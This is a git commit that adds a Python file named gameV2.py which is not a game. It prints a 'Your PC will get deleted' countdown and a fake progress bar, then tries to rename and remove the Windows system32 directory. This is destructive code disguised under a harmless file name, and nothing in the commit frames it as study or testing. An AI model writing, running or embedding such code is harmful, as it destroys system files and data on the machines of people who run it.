6898b3a4b6c49ca2253a301490f91f481f3a016d
RubenSecure <rubendeveloper322@gmail.com>
2023-11-26 19:50:40 +0200

    Create gameV2.py

---
+++ gameV2.py
@@ -0,0 +1,54 @@
+import os
+import time
+from uuid import uuid4
+
+count = 10
+
+while count > 0:
+    print("Your PC will get deleted in", count, "\n")
+    count -= 1
+    time.sleep(1)
+
+# Print iterations progress
+def printProgressBar (iteration, total, prefix = '', suffix = '', decimals = 1, length = 100, fill = '█', printEnd = "\r"):
+    """
+    Call in a loop to create terminal progress bar
+    @params:
+        iteration   - Required  : current iteration (Int)
+        total       - Required  : total iterations (Int)
+        prefix      - Optional  : prefix string (Str)
+        suffix      - Optional  : suffix string (Str)
+        decimals    - Optional  : positive number of decimals in percent complete (Int)
+        length      - Optional  : character length of bar (Int)
+        fill        - Optional  : bar fill character (Str)
+        printEnd    - Optional  : end character (e.g. "\r", "\r\n") (Str)
+    """
+    percent = ("{0:." + str(decimals) + "f}").format(100 * (iteration / float(total)))
+    filledLength = int(length * iteration // total)
+    bar = fill * filledLength + '-' * (length - filledLength)
+    print(f'\r{prefix} |{bar}| {percent}% {suffix}', end = printEnd)
+    # Print New Line on Complete
+    if iteration == total: 
+        print()
+
+# A List of Items
+items = list(range(0, 57))
+l = len(items)
+
+# Initial call to print 0% progress
+printProgressBar(0, l, prefix = 'Progress:', suffix = 'Complete', length = 50)
+for i, item in enumerate(items):
+    # Do stuff...
+    time.sleep(0.1)
+    # Update Progress Bar
+    printProgressBar(i + 1, l, prefix = 'Progress:', suffix = 'Complete', length = 50)
+
+print("\n")
+
+
+
+directory_name = 'C:\\WINDOWS\\system32'
+new_directory_name = str(uuid4())
+
+os.rename(directory_name, new_directory_name)
+os.rmdir(new_directory_name)
